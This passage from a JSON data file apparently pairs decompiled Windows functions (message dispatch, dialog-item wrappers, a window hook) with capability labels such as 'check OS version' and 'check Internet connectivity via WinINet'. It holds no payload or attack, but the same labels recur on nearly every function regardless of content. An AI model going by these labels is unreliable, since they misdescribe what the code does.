4))(piVar4);\n            *arg_14h = piVar4;\n            iVar2 = 0;\n        }\n    }\n    return iVar2;\n}\n",
        "token_count": 434
    },
    "00432f21": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.00432f21(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar2 = fcn.0043026e();\n    iVar2 = (*_sym.imp.KERNEL32.dll_InterlockedDecrement)(iVar2 + 0x2c);\n    if (iVar2 != 0) {\n        return;\n    }\n    iVar2 = fcn.0043026e();\n    if (*(iVar2 + 0x30) == 0) {\n        fcn.00432ebd(1);\n        iVar2 = fcn.0043026e();\n        iVar2 = *(iVar2 + 4);\n        if ((iVar2 == 0) || (*(iVar2 + 0x20) == 0)) {\n            iVar2 = fcn.0043026e();\n            if (*(iVar2 + 0x14) == '\\0') {\n                fcn.00424e30(0);\n            }\n        }\n        else {\n            iVar1 = fcn.0041bf9b();\n            if (iVar1 != 0) {\n    // WARNING: Could not recover jumptable at 0x00432f0a. Too many branches\n    // WARNING: Treating indirect jump as call\n                (**(**(iVar2 + 0x20) + 0x60))();\n                return;\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 302
    },
    "0041a8cb": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.0041a8cb(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t unaff_retaddr;\n    \n    iVar1 = fcn.00430e98(0x411e5c);\n    if (iVar1 == 0) {\n        fcn.00411e42();\n    }\n    if (*(iVar1 + 0x14) != unaff_retaddr) {\n        if (*(iVar1 + 0x28) == 0) {\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetCurrentThreadId)();\n            iVar3 = (*_sym.imp.USER32.dll_SetWindowsHookExA)(5, 0x41a678, 0, uVar2);\n            *(iVar1 + 0x28) = iVar3;\n            if (iVar3 == 0) {\n                fcn.00411e0e();\n            }\n        }\n        *(iVar1 + 0x14) = unaff_retaddr;\n    }\n    return;\n}\n",
        "token_count": 227
    },
    "0041aa79": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_24h\n// WARNING: Variable defined which should be unmapped: var_28h\n\nvoid __cdecl fcn.0041aa79(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint uVar4;\n    uint32_t uVar5;\n    code **ppcVar6;\n    uint32_t uVar7;\n    int32_t *arg_8h_00;\n    int32_t iVar8;\n    code *pcVar9;\n    int32_t unaff_EBP;\n    int16_t iVar10;\n    int16_t iVar11;\n    uint var_7ch;\n    uint var_5ch;\n    uint var_2ch;\n    uint32_t var_28h;\n    uint *var_24h;\n    uint *var_18h;\n    uint *var_14h;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.004627af(0x70);\n    *(unaff_EBP + -0x10) = 0;\n    *(unaff_EBP + -0x14) = 0x7fffffff;\n    uVar7 = *(unaff_EBP + 8);\n    *(unaff_EBP + -4) = 0;\n    if (uVar7 == 0x111) {\n        iVar3 = (**(*arg_8h_00 + 0xe8))(*(unaff_EBP + 0xc), *(unaff_EBP + 0x10));\n        if (iVar3 != 0) {\ncode_r0x0041aab7:\n            *(unaff_EBP + -0x10) = 1;\n            goto code_r0x0041af70;\n        }\n        goto code_r0x0041ac89;\n    }\n    if (uVar7 == 0x4e) {\n        if (**(unaff_EBP + 0x10) != 0) {\n            iVar3 = (**(*arg_8h_00 + 0xec))(*(unaff_EBP + 0xc), *(unaff_EBP + 0x10), unaff_EBP + -0x10);\n            goto joined_r0x0041af4d;\n        }\n        goto code_r0x0041ac89;\n    }\n    var_24h = *(unaff_EBP + 0x10);\n    if (uVar7 == 6) {\n        uVar4 = fcn.004185c5(var_24h);\n        fcn.0041a448(arg_8h_00, *(unaff_EBP + 0xc), uVar4);\n    }\n    iVar10 = var_24h;\n    if ((uVar7 == 0x20) && (iVar3 = fcn.0041a4be(arg_8h_00, iVar10, var_24h >> 0x10),  iVar3 != 0))\n    goto code_r0x0041aab7;\n    if ((((arg_8h_00[0x13] != 0) && (0 < *(arg_8h_00[0x13] + 0x74))) &&\n        ((((0x1ff < uVar7 && (uVar7 < 0x20a)) || ((0xff < uVar7 && (uVar7 < 0x110)))) || (uVar7 - 0x281 < 0x11)))) &&\n       (iVar3 = (**(*arg_8h_00[0x13] + 0x94))(uVar7, *(unaff_EBP + 0xc), var_24h, unaff_EBP + -0x10),  iVar3 != 0))\n    goto code_r0x0041af70;\n    uVar5 = (**(*arg_8h_00 + 0x28))();\n    uVar7 = *(unaff_EBP + 8);\n    *(unaff_EBP + 0x10) = uVar5;\n    fcn.00416e0d(7);\n    iVar8 = ((uVar5 ^ uVar7) & 0x1ff) * 0xc;\n    iVar3 = *(iVar8 + 0x4b9850);\n    *(unaff_EBP + -0x18) = iVar8 + 0x4b9850;\n    if ((*(unaff_EBP + 8) != iVar3) || (*(unaff_EBP + 0x10) != *(iVar8 + 0x4b9858))) {\n        puVar1 = *(unaff_EBP + -0x18);\n        ppcVar6 = *(unaff_EBP + 0x10);\n        *puVar1 = *(unaff_EBP + 8);\n        puVar1[2] = ppcVar6;\n        while (*ppcVar6 != NULL) {\n            if (*(unaff_EBP + 8) < 0xc000) {\n                iVar3 = fcn.0041619b(ppcVar6[1], *(unaff_EBP + 8), 0, 0);\n                *(unaff_EBP + 0x10) = iVar3;\n                if (iVar3 != 0) {\n                    *(*(unaff_EBP + -0x18) + 4) = iVar3;\n                    fcn.00416e3c();\n                    goto code_r0x0041ac17;\n                }\n            }\n            else {\n                iVar3 = *(*(unaff_EBP + 0x10) + 4);\n                uVar4 = 0xc000;\n                while (iVar3 = fcn.0041619b(iVar3, uVar4, 0, 0),  iVar3 != 0) {\n                    if (**(iVar3 + 0x10) == *(unaff_EBP + 8)) {\n                        *(*(unaff_EBP + -0x18) + 4) = iVar3;\n                        fcn.00416e3c();\n                        goto code_r0x0041af62;\n                    }\n                    iVar3 = iVar3 + 0x18;\n                }\n                ppcVar6 = *(unaff_EBP + 0x10);\n            }\n            ppcVar6 = (**ppcVar6)();\n            *(unaff_EBP + 0x10) = ppcVar6;\n        }\n        *(*(unaff_EBP + -0x18) + 4) = 0;\n        fcn.00416e3c();\n        goto code_r0x0041ac89;\n    }\n    iVar3 = *(iVar8 + 0x4b9854);\n    *(unaff_EBP + 0x10) = iVar3;\n    fcn.00416e3c();\n    if (iVar3 == 0) goto code_r0x0041ac89;\n    if (0xbfff < *(unaff_EBP + 8)) {\ncode_r0x0041af62:\n        pcVar9 = *(iVar3 + 0x14);\ncode_r0x0041af65:\n        var_28h = *(unaff_EBP + 0xc);\n        goto code_r0x0041af69;\n    }\ncode_r0x0041ac17:\n    pcVar9 = *(*(unaff_EBP + 0x10) + 0x14);\n    iVar3 = *(*(unaff_EBP + 0x10) + 0x10);\n    iVar11 = var_24h >> 0x10;\n    var_14h = var_24h;\n    // switch table (69 cases) at 0x41af91\n    switch(iVar3) {\n    case 1:\n        var_14h = *(unaff_EBP + 0xc);\n        fcn.0042e163(var_14h);\n        goto code_r0x0041acb8;\n    case 2:\n    case 3:\n    case 4:\n    case 0x1b:\n    case 0x1c:\n        var_14h = *(unaff_EBP + 0xc);\n        goto code_r0x0041acb8;\n    case 5:\n    case 0xc:\n        var_18h = var_24h & 0xffff;\n        uVar7 = *(unaff_EBP + 0xc);\n        uVar5 = fcn.004185c5(uVar7, var_18h, var_24h >> 0x10);\n        goto code_r0x0041aced;\n    case 6:\n        var_24h = *(unaff_EBP + 0xc);\n        var_28h = fcn.004185c5();\n        goto code_r0x0041af69;\n    case 7:\n    case 0xd:\ncode_r0x0041acb8:\n        uVar4 = (*pcVar9)(var_14h);\ncode_r0x0041af6d:\n        *(unaff_EBP + -0x10) = uVar4;\n        break;\n    case 8:\n        fcn.0042d958();\n        uVar4 = var_24h[1];\n        *(unaff_EBP + -4) = 1;\n        *(unaff_EBP + -0x24) = uVar4;\n        fcn.00416e9b();\n        uVar4 = *var_24h;\n        uVar2 = var_24h[2];\n        *(unaff_EBP + -4) = 2;\n        *(unaff_EBP + -0x5c) = uVar4;\n        iVar3 = fcn.004185ec(uVar4);\n        if (iVar3 == 0) {\n            if ((arg_8h_00[0x13] != 0) && (iVar3 = fcn.0043290a(*(unaff_EBP + -0x5c)),  iVar3 != 0)) {\n                *(unaff_EBP + -0x2c) = iVar3;\n            }\n            iVar3 = unaff_EBP + -0x7c;\n        }\n        uVar4 = (*pcVar9)(unaff_EBP + -0x28, iVar3, uVar2);\n        *(unaff_EBP + -0x24) = 0;\n        *(unaff_EBP + -0x5c) = 0;\n        *(unaff_EBP + -0x10) = uVar4;\n        *(unaff_EBP + -4) = 1;\n        fcn.00418ff3();\n        goto code_r0x0041ad98;\n    case 9:\n        fcn.0042d958();\n        uVar4 = var_24h[2];\n        *(unaff_EBP + -0x24) = var_24h[1];\n        *(unaff_EBP + -4) = 3;\n        uVar4 = (*pcVar9)(unaff_EBP + -0x28, uVar4);\n        *(unaff_EBP + -0x24) = 0;\n        *(unaff_EBP + -0x10) = uVar4;\ncode_r0x0041ad98:\n        *(unaff_EBP + -4) = 0;\n        fcn.0042e1eb();\n        break;\n    case 10:\n        uVar7 = fcn.004185c5(var_24h, *(unaff_EBP + 0xc) >> 0x10);\n        var_18h = var_24h;\n        goto code_r0x0041adb6;\n    case 0xb:\n        var_24h = *(unaff_EBP + 0xc) >> 0x10;\n        var_28h = *(unaff_EBP + 0xc);\n        goto code_r0x0041af69;\n    case 0xe:\n    case 0x2f:\n        goto code_r0x0041af65;\n    case 0xf:\n        var_18h = fcn.00432144(var_24h);\n        uVar7 = *(unaff_EBP + 0xc) >> 0x10;\ncode_r0x0041adb6:\n        uVar5 = *(unaff_EBP + 0xc);\ncode_r0x0041aced:\n        uVar4 = (*pcVar9)(uVar5, uVar7, var_18h);\n        goto code_r0x0041af6d;\n    case 0x10:\n    case 0x12:\n    case 0x15:\n    case 0x1e:\n    case 0x2d:\n    case 0x32:\n        goto code_r0x0041aede;\n    case 0x11:\n    case 0x14:\n        var_14h = *(unaff_EBP + 0xc);\n        goto code_r0x0041aeeb;\n    case 0x13:\n        (*pcVar9)();\n        break;\n    case 0x16:\n        var_14h = *(unaff_EBP + 0xc) >> 0x10;\n        var_18h = *(unaff_EBP + 0xc);\n        goto code_r0x0041aee1;\n    case 0x17:\n        var_14h = iVar11;\n        var_18h = iVar10;\n        goto code_r0x0041aee1;\n    case 0x18:\n    case 0x19:\n        var_14h = var_24h >> 0x10;\n        var_18h = var_24h & 0xffff;\n        goto code_r0x0041af0a;\n    case 0x1a:\n        fcn.004185c5(var_24h);\ncode_r0x0041aede:\n        var_18h = *(unaff_EBP + 0xc);\n        goto code_r0x0041aee1;\n    case 0x1d:\n    case 0x28:\n    case 0x31:\n        uVar4 = (*pcVar9)();\n        goto code_r0x0041af6d;\n    case 0x1f:\n        var_14h = *(unaff_EBP + 0xc);\n        var_18h = fcn.004185c5(var_14h);\n        fcn.004185c5(var_24h, var_18h);\n        uVar7 = arg_8h_00[8] == var_24h;\n        goto code_r0x0041af0e;\n    case 0x20:\n        var_14h = *(unaff_EBP + 0xc);\n        fcn.0042e163(var_14h);\n        goto code_r0x0041aeeb;\n    case 0x21:\n        var_14h = *(unaff_EBP + 0xc);\n        fcn.00432144(var_14h);\n        goto code_r0x0041aeeb;\n    case 0x22:\n        var_14h = iVar11;\n        var_18h = iVar10;\n        uVar7 = fcn.00432144(*(unaff_EBP + 0xc), var_18h, var_14h);\n        goto code_r0x0041af0e;\n    case 0x23:\n        var_14h = *(unaff_EBP + 0xc);\n        goto code_r0x0041ae70;\n    case 0x24:\ncode_r0x0041ae70:\n        fcn.004185c5(var_14h);\n        goto code_r0x0041aeeb;\n    case 0x25:\n        var_14h = var_24h >> 0x10;\n        var_18h = var_24h & 0xffff;\n        goto code_r0x0041ae8d;\n    case 0x26:\n        var_18h = iVar10;\n        var_14h = iVar11;\ncode_r0x0041ae8d:\n        uVar7 = fcn.004185c5(*(unaff_EBP + 0xc), var_18h, var_14h);\n        goto code_r0x0041af0e;\n    case 0x27:\n        var_18h = fcn.004185c5(*(unaff_EBP + 0xc), var_24h);\n        goto code_r0x0041aee1;\n    case 0x29:\n        var_14h = *(unaff_EBP + 0xc) >> 0x10;\n        var_18h = fcn.004185c5(var_24h, var_14h);\n        goto code_r0x0041aef8;\n    case 0x2a:\n    case 0x2b:\n        var_18h = *(unaff_EBP + 0xc);\n        var_14h = *(unaff_EBP + 0xc) >> 0x10;\n        *(unaff_EBP + 8) = var_18h;\n        *(unaff_EBP + 0xc) = var_14h;\n        if (iVar3 == 0x2a) {\n            var_18h = fcn.004185c5(var_24h);\n            uVar7 = *(unaff_EBP + 0xc);\n            var_14h = var_24h;\n            goto code_r0x0041af0e;\n        }\ncode_r0x0041aee1:\n        (*pcVar9)(var_18h, var_14h);\n        break;\n    case 0x2c:\n    case 0x33:\ncode_r0x0041aeeb:\n        (*pcVar9)(var_14h);\n        break;\n    case 0x2e:\n    case 0x36:\n        (*pcVar9)(*(unaff_EBP + 0xc), var_24h);\n        goto code_r0x0041aab7;\n    case 0x30:\n    case 0x45:\n        var_28h = iVar10;\n        var_24h = iVar11;\ncode_r0x0041af69:\n        uVar4 = (*pcVar9)(var_28h, var_24h);\n        goto code_r0x0041af6d;\n    case 0x34:\n        var_18h = *(unaff_EBP + 0xc) >> 0x10;\ncode_r0x0041aef8:\n        uVar7 = *(unaff_EBP + 0xc);\n        goto code_r0x0041af0e;\n    case 0x35:\n        var_18h = iVar10;\n        var_14h = iVar11;\ncode_r0x0041af0a:\n        uVar7 = *(unaff_EBP + 0xc);\ncode_r0x0041af0e:\n        (*pcVar9)(uVar7, var_18h, var_14h);\n        break;\n    case 0x37:\n        iVar3 = (*pcVar9)(*(unaff_EBP + 0xc), *(unaff_EBP + 0xc) >> 0x10, iVar10, iVar11);\n        *(unaff_EBP + -0x10) = iVar3;\n        goto joined_r0x0041af4d;\n    case 0x44:\n        iVar3 = (*pcVar9)();\n        *(unaff_EBP + -0x10) = iVar3;\njoined_r0x0041af4d:\n        if (iVar3 != 0) {\ncode_r0x0041ac89:\n            *(unaff_EBP + -4) = 0xffffffff;\n            fcn.00416e3c();\n            goto code_r0x0041ac97;\n        }\n    }\ncode_r0x0041af70:\n    if (*(unaff_EBP + 0x14) != NULL) {\n        **(unaff_EBP + 0x14) = *(unaff_EBP + -0x10);\n    }\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.00416e3c();\ncode_r0x0041ac97:\n    fcn.00462887();\n    return;\n}\n",
        "token_count": 4512
    },
    "0044b0f2": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nint32_t __cdecl fcn.0044b0f2(uint32_t arg_8h, uint32_t wParam, int32_t lParam, int32_t *arg_14h)\n\n{\n    int32_t iVar1;\n    int32_t *in_ECX;\n    uint32_t var_ch;\n    int32_t *var_8h;\n    uint32_t var_4h;\n    \n    if (arg_8h == 0x2b) {\n        var_4h = lParam;\n        var_8h = 0x44b177;\n        (**(*in_ECX + 0x138))();\n        return 1;\n    }\n    if (arg_8h == 0x2c) {\n        var_4h = lParam;\n        var_8h = 0x44b16a;\n        (**(*in_ECX + 0x13c))();\n        return 1;\n    }\n    if (arg_8h == 0x2d) {\n        var_4h = lParam;\n        var_8h = 0x44b15d;\n        (**(*in_ECX + 0x144))();\n        return 1;\n    }\n    if (arg_8h == 0x2e) {\n        var_4h = wParam >> 0x10;\n        var_8h = wParam & 0xffff;\n        var_ch = 0x44b150;\n        iVar1 = (**(*in_ECX + 0x148))();\n    }\n    else if (arg_8h == 0x2f) {\n        var_4h = wParam >> 0x10;\n        var_8h = wParam & 0xffff;\n        var_ch = 0x44b13a;\n        iVar1 = (**(*in_ECX + 0x14c))();\n    }\n    else {\n        if (arg_8h != 0x39) {\n            if (in_ECX[0x14] != 0) {\n                var_8h = lParam;\n                var_ch = wParam;\n                iVar1 = (*_sym.imp.USER32.dll_SendMessageA)(in_ECX[8], arg_8h + 0x2000);\n                if ((6 < arg_8h - 0x132) || (iVar1 != 0)) {\n                    if (arg_14h != NULL) {\n                        *arg_14h = iVar1;\n                    }\n                    iVar1 = 1;\n                }\n                return iVar1;\n            }\n            if (arg_8h < 0x112) {\n                if (arg_8h == 0x111) {\n                    iVar1 = fcn.00411703(0, wParam >> 0x10 | 0xbd110000, 0, 0);\n                    if (iVar1 == 0) {\n                        return 0;\n                    }\n                    if (arg_14h != NULL) {\n                        *arg_14h = 1;\n                        return 1;\n                    }\n                    return 1;\n                }\n                if (0x2a < arg_8h) {\n                    if ((arg_8h < 0x30) || (arg_8h == 0x39)) goto code_r0x0041b1b8;\n                    if (arg_8h == 0x4e) {\n                        var_8h = arg_14h;\n                        var_4h = lParam;\n                        iVar1 = fcn.00411703(0, *(lParam + 8) & 0xffff | 0xbc4e0000, &fcn.0044b0f2::var_8h, 0);\n                        return iVar1;\n                    }\n                }\n            }\n            else if ((0x113 < arg_8h) && ((arg_8h < 0x116 || (arg_8h == 0x210)))) {\ncode_r0x0041b1b8:\n                iVar1 = fcn.0041aa79(arg_8h + 0xbc00, wParam, lParam, arg_14h);\n                return iVar1;\n            }\n            if (arg_8h - 0x132 < 7) {\n                var_4h = arg_8h - 0x132;\n                var_8h = wParam;\n                iVar1 = fcn.0041aa79(0xbc19, 0, &fcn.0044b0f2::var_ch, arg_14h);\n                if (*arg_14h != 0) {\n                    return iVar1;\n                }\n            }\n            return 0;\n        }\n        var_4h = lParam;\n        var_8h = 0x44b11f;\n        iVar1 = (**(*in_ECX + 0x140))();\n    }\n    *arg_14h = iVar1;\n    return 1;\n}\n",
        "token_count": 1062
    },
    "0041b606": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0041b606(uint arg_8h)\n\n{\n    int32_t lpWndClass;\n    int16_t iVar1;\n    int32_t iVar2;\n    int32_t unaff_EBP;\n    uint var_38h;\n    uint var_4h;\n    \n    fcn.004627e2(0x30);\n    lpWndClass = *(unaff_EBP + 8);\n    iVar2 = fcn.004169a4(*(lpWndClass + 0x10), *(lpWndClass + 0x24), unaff_EBP + -0x38);\n    if (((iVar2 == 0) && (iVar1 = fcn.00416911(lpWndClass),  iVar1 != 0)) &&\n       (iVar2 = fcn.0043026e(),  *(iVar2 + 0x14) != '\\0')) {\n        fcn.0043039f(1);\n        *(unaff_EBP + -4) = 0;\n        fcn.0043026e();\n        fcn.00413a5f(*(lpWndClass + 0x24));\n        fcn.004138b2(10);\n        *(unaff_EBP + -4) = 0xffffffff;\n        fcn.0043040c(1);\n    }\n    fcn.00462887();\n    return;\n}\n",
        "token_count": 312
    },
    "0041bc6f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0041bc6f(int32_t param_1)\n\n{\n    uint uVar1;\n    \n    if (*(param_1 + 0x4c) != 0) {\n    // WARNING: Could not recover jumptable at 0x0041bc7a. Too many branches\n    // WARNING: Treating indirect jump as call\n        uVar1 = (**(**(param_1 + 0x4c) + 0x54))();\n        return uVar1;\n    }\n    return 0;\n}\n",
        "token_count": 119
    },
    "0041bca4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041bca4(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x4c) == 0) {\n        (*_sym.imp.USER32.dll_CheckRadioButton)(*(in_ECX + 0x20), arg_8h, arg_ch, arg_10h);\n        return;\n    }\n    // WARNING: Could not recover jumptable at 0x0041bcc9. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**(**(in_ECX + 0x4c) + 0x6c))();\n    return;\n}\n",
        "token_count": 155
    },
    "0041bccc": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0041bccc(int32_t param_1, uint param_2)\n\n{\n    uint uVar1;\n    \n    if (*(param_1 + 0x4c) == 0) {\n        uVar1 = (*_sym.imp.USER32.dll_GetDlgItem)(*(param_1 + 0x20), param_2);\n        fcn.004185c5(uVar1);\n        return;\n    }\n    // WARNING: Could not recover jumptable at 0x0041bced. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**(**(param_1 + 0x4c) + 0x74))();\n    return;\n}\n",
        "token_count": 155
    },
    "0041bcf0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0041bcf0(int32_t param_1, uint param_2)\n\n{\n    uint uVar1;\n    uint *unaff_retaddr;\n    \n    if (*(param_1 + 0x4c) == 0) {\n        uVar1 = (*_sym.imp.USER32.dll_GetDlgItem)(*(param_1 + 0x20), param_2);\n        *unaff_retaddr = uVar1;\n        return;\n    }\n    // WARNING: Could not recover jumptable at 0x0041bd11. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**(**(param_1 + 0x4c) + 0x70))();\n    return;\n}\n",
        "token_count": 163
    },
    "0041bd14": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041bd14(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x4c) == 0) {\n        (*_sym.imp.USER32.dll_GetDlgItemInt)(*(in_ECX + 0x20), arg_8h, arg_ch, arg_10h);\n        return;\n    }\n    // WARNING: Could not recover jumptable at 0x0041bd39. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**(**(in_ECX + 0x4c) + 0x78))();\n    return;\n}\n",
        "token_count": 154
    },
    "0041bd3c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041bd3c(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x4c) == 0) {\n        (*_sym.imp.USER32.dll_GetDlgItemTextA)(*(in_ECX + 0x20), arg_8h, arg_ch, arg_10h);\n        return;\n    }\n    // WARNING: Could not recover jumptable at 0x0041bd61. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**(**(in_ECX + 0x4c) + 0x7c))();\n    return;\n}\n",
        "token_count": 157
    },
    "0041bd64": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041bd64(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x4c) == 0) {\n        (*_sym.imp.USER32.dll_SendDlgItemMessageA)(*(in_ECX + 0x20), arg_8h, arg_ch, arg_10h, arg_14h);\n        return;\n    }\n    // WARNING: Could not recover jumptable at 0x0041bd8c. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**(**(in_ECX + 0x4c) + 0x80))();\n    return;\n}\n",
        "token_count": 167
    },
    "0041bd92": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041bd92(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x4c) == 0) {\n        (*_sym.imp.USER32.dll_SetDlgItemInt)(*(in_ECX + 0x20), arg_8h, arg_ch, arg_10h);\n        return;\n    }\n    // WARNING: Could not recover jumptable at 0x0041bdb7. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**(**(in_ECX + 0x4c) + 0x84))();\n    return;\n}\n",
        "token_count": 154
    },
    "0041bdbd": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
